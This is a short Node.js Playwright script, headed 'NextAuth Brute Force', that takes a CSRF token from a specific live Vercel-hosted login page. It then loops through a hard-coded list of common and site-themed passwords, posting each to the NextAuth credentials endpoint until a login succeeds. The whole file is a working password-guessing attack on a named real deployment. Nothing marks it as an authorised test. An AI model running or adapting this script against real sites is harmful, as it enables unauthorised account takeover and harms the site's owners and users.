const { chromium } = require('playwright');

(async () => {
    console.log("=== NextAuth Brute Force ===");
    
    const browser = await chromium.launch({ headless: true });
    const context = await browser.newContext();
    const page = await context.newPage();
    
    // Navigate to get CSRF token
    await page.goto('https://sturdy-octo-memory-three.vercel.app/login');
    await page.waitForTimeout(2000);
    
    // Get CSRF token
    const csrfResponse = await page.evaluate(async () => {
        const res = await fetch('/api/auth/csrf');
        return await res.json();
    });
    console.log("CSRF Token:", csrfResponse.csrfToken);
    
    // Passwords to try
    const passwords = [
        'admin', 'password', '123456', 'admin123', 'password123',
        'test', 'test123', 'shop', 'shop123', 'business',
        'tracker', 'daily', 'kenya', 'retail', 'store',
        'login', 'pass', 'secret', 'demo', 'root',
        '1234', '12345', '123456789', 'qwerty', 'abc123',
        'letmein', 'welcome', 'master', 'hello', 'charlie',
        'donald', '123123', '654321', 'superman', 'password1',
        'Password1', 'Password123', 'Admin123', 'admin2024',
        'admin2025', 'admin2026', 'P@ssw0rd', 'Changeme1',
        'iloveyou', 'baby', 'sunshine', 'princess', 'football',
        'shadow', 'michael', 'trustno1', 'qazwsx', 'starwars'
    ];
    
    console.log(`\nTrying ${passwords.length} passwords...`);
    
    for (const password of passwords) {
        try {
            const result = await page.evaluate(async (data) => {
                const res = await fetch('/api/auth/callback/credentials', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `password=${encodeURIComponent(data.password)}&redirect=false&csrfToken=${data.csrfToken}&callbackUrl=${encodeURIComponent('https://sturdy-octo-memory-three.vercel.app/login')}&json=true`
                });
                const text = await res.text();
                return { status: res.status, body: text.substring(0, 200) };
            }, { password, csrfToken: csrfResponse.csrfToken });
            
            if (result.status === 200 || result.body.includes('dashboard')) {
                console.log(`\n[!!!] PASSWORD FOUND: ${password}`);
                console.log(`Status: ${result.status}`);
                console.log(`Response: ${result.body}`);
                break;
            }
            
            process.stdout.write(`.`);
            
        } catch (e) {
            console.log(`x Error: ${e.message}`);
        }
    }
    
    console.log("\n\nBrute force complete.");
    
    await browser.close();
})();
